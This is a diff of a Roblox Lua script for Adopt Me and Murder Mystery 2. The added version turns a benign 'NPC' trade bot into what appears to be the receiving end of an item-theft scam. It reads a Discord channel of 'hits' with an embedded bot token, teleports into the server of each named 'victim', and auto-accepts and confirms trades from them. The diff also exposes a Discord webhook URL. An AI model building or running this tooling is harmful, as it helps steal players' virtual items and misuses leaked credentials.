@@ -1,94 +1,105 @@
 if not game:IsLoaded() then
-    game.Loaded:Wait() -- Wait for game to load
+	game.Loaded:Wait() -- Wait for game to load
 end
 
--- Roblox Services
-local HttpServ = game:GetService("HttpService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local bb = game:GetService("VirtualUser") -- Anti AFK
+if token == "MTQ4MjIxNTQxMzgxODMyNzA2MA.G8xb4n.HswfjR8l1KPXi1Ki3ujOFdDrEdeMkRUVUK_QLc" or channelId == "1482215680718929982" then
+    game.Players.LocalPlayer:kick("Add your token or channelId to use")
+end
 
--- Anti-AFK
-game:GetService("Players").LocalPlayer.Idled:Connect(function()
+local bb = game:GetService("VirtualUser") -- Anti AFK
+game:service "Players".LocalPlayer.Idled:connect(function()
     bb:CaptureController()
     bb:ClickButton2(Vector2.new())
 end)
 
--- Files and NPC setup
-local npcFile = isfile("user.txt")
+local HttpServ = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local victimFile = isfile("user.txt")
 local joinedFile = isfile("joined_ids.txt")
-
-if not npcFile then
-    writefile("user.txt", "npc username")
+if not victimFile then
+    writefile("user.txt", "victim username")
 end
-
 if not joinedFile then
-    writefile("joined_ids.txt", "[]") -- Initialize empty JSON array
+    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
 end
-
-local npcUser = readfile("user.txt")
+local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
-local didNpcLeave = false
+local didVictimLeave = false
 local timer = 0
 
--- Discord Webhook URL
-local webhook = "https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY" -- Add your webhook here
-
--- Send a message to Discord
-local function sendWebhookMessage(text)
-    request({
-        Url = webhook,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = HttpServ:JSONEncode({content = text})
-    })
-end
-
--- Save joined message IDs
 local function saveJoinedId(messageId)
-    table.insert(joinedIds, messageId)
-    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
+    table.insert(joinedIds, messageId) -- Add the new ID
+    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
 end
 
--- Detect NPC leaving the server
-local function waitForNpcLeave()
+local function waitForPlayerLeave()
     local playerRemovedConnection
     playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
-        if removedPlayer.Name == npcUser then
+        if removedPlayer.Name == victimUser then
             if playerRemovedConnection then
                 playerRemovedConnection:Disconnect()
             end
-            didNpcLeave = true
-            sendWebhookMessage("NPC left the server: "..npcUser)
+            didVictimLeave = true
         end
     end)
 end
 
-waitForNpcLeave() -- Start listening
+waitForPlayerLeave() -- Start listening for the victim leaving
 
--- Auto-join function (logs to webhook instead of Discord API)
 local function unifiedAutoJoin()
-    if didNpcLeave or timer >= 10 then
-        sendWebhookMessage("NPC left or timer reached 10, ready to join new server")
-        -- If you have placeId/jobId logic, you can call TeleportService here
-        -- Example:
-        -- game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
+    if didVictimLeave or timer >= 10 then -- Only run if victim left or if timer is 10 or more
+        local response = request({
+            Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+            Method = "GET",
+            Headers = {
+                ['Authorization'] = token,
+                ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+                ["Content-Type"] = "application/json"
+            }
+        })
+
+        if response.StatusCode == 200 then
+            local messages = HttpServ:JSONDecode(response.Body)
+            if #messages == 0 then
+                warn("0 messages found. Make sure the channelId is the channel you get hits in")
+                return
+            end
+
+            for _, message in ipairs(messages) do
+                if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
+                    if message.embeds[1].title:find("Join to get") then
+                        local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
+                        if placeId and jobId then
+                            local victimUsername = message.embeds[1].fields[1].value
+
+                            if not table.find(joinedIds, tostring(message.id)) then
+                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
+                                writefile("user.txt", victimUsername)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+                                return
+                            end
+                        end
+                    end
+                end
+            end
+        else
+            warn("Response code is not 200. Is your token and channelid correct?")
+        end
     end
 end
 
--- Roblox Place IDs
 local adoptMeId = 920587237
 local mm2Id = 142823291
 
--- ADOPT ME Trading Logic
 if game.PlaceId == adoptMeId then
     local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
     while loadingScreen.Enabled do
-        wait(1)
+        wait(1) -- We wait while the loading screen is active
     end
     wait(10)
-    local waittime = 0.1
-    wait(waittime)
+    local waittime = delay or 0.1
+    wait(waittime) -- Small delay to make sure we are fully loaded
 
     local tradeFrame = playerGui.TradeApp.Frame
     local Loads = require(game.ReplicatedStorage.Fsys).load
@@ -100,17 +111,14 @@ if game.PlaceId == adoptMeId then
     local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
     local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
 
-    -- Accept trade requests from NPC only
     TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
-        if sender.Name == npcUser then
+        if sender.Name == victimUser then
             TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
-            sendWebhookMessage("Accepted trade request from NPC: "..npcUser)
         else
             TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
         end
     end)
 
-    -- Say hi in chat
     game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
 
     local foodAdded = false
@@ -132,7 +140,6 @@ if game.PlaceId == adoptMeId then
                         local randomFoodUid = foodKeys[randomIndex]
                         AddItemRemote:FireServer(randomFoodUid)
                         foodAdded = true
-                        sendWebhookMessage("Added food to trade: "..randomFoodUid)
                     end
                 end
                 AcceptNegotiationRemote:FireServer()
@@ -144,7 +151,6 @@ if game.PlaceId == adoptMeId then
         while task.wait(0.1) do
             if IsTrading() and foodAdded then
                 ConfirmTradeRemote:FireServer()
-                sendWebhookMessage("Confirmed trade with NPC: "..npcUser)
             end
         end
     end
@@ -160,15 +166,13 @@ if game.PlaceId == adoptMeId then
         end
     end
 
-    task.spawn(acceptTrade)
-    task.spawn(confirmTrade)
+    task.spawn(acceptTrade) -- Start accepting trades
+    task.spawn(confirmTrade) -- Start confirming trades
     task.spawn(tradeTimer)
 
     while wait(5) do
         unifiedAutoJoin()
     end
-
--- MURDER MYSTERY 2 Device/Trade Logic
 elseif game.PlaceId == mm2Id then
     local function selectDevice()
         while task.wait(0.1) do
@@ -186,32 +190,36 @@ elseif game.PlaceId == mm2Id then
             end
         end
     end
-
+    
     task.spawn(selectDevice)
-
-    local mainGui = game.Players.LocalPlayer:WaitForChild('PlayerGui', 30):WaitForChild('MainGUI', 30)
-    local waittime = 3
-    wait(waittime)
-    local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
+    
+    local mainGui = game.Players.LocalPlayer:WaitForChild('PlayerGui', 30):WaitForChild('MainGUI', 30) -- Wait for main gui so we know we are loaded
+    local waittime = delay or 3
+    wait(waittime) -- Small delay to account for ping and stuff
+    local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest') -- Just to make sure we are fully loaded before chatting (or it will bug)
     game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
-
+    
     local function acceptRequest()
         while task.wait(0.1) do
             game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest'):FireServer()
         end
     end
-
+    
     local function acceptTrade()
         while task.wait(0.1) do
             game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
         end
     end
-
+    
     local function IsTrading()
-        local trade_status = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
-        return trade_status == "StartTrade"
+        local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+        if trade_statue == "StartTrade" then
+            return true
+        else
+            return false
+        end
     end
-
+    
     local function tradeTimer()
         while task.wait(1) do
             if IsTrading() then
@@ -221,11 +229,11 @@ elseif game.PlaceId == mm2Id then
             end
         end
     end
-
-    task.spawn(acceptRequest)
-    task.spawn(acceptTrade)
+    
+    task.spawn(acceptRequest) -- Start accepting trade requests
+    task.spawn(acceptTrade) -- Start accepting trades
     task.spawn(tradeTimer)
-
+    
     while wait(5) do
         unifiedAutoJoin()
     end
